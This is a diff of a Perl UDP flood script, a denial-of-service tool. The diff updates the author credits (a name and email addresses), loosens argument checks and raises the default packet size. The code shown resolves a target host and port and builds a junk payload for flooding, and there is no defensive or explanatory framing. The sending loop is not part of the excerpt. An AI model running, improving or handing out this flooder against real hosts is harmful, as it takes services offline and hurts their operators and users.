@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 #udp flood
-#by
-#m0nad /at/ email.com
+#Victor "m0nad" Ramos Mello
+#victornrm at gmail.com | m0nad at email.com
 use Socket;
 
-my $host	= shift or die "$0 <host> <port> <size>\n";
-my $port	= shift or die "$0 <host> <port> <size>\n";
+my $host	= shift;
+my $port	= shift or die "$0 <host> <port> [size]\n";
 
-my $size	= shift || int rand (1024); #int rand 65507;
+my $size	= shift || int rand (1500); #int rand 65507;
 my $ipaddr	= inet_aton ($host);
 my $portaddr	= sockaddr_in ($port, $ipaddr);
 my $flood	= "a" x $size;
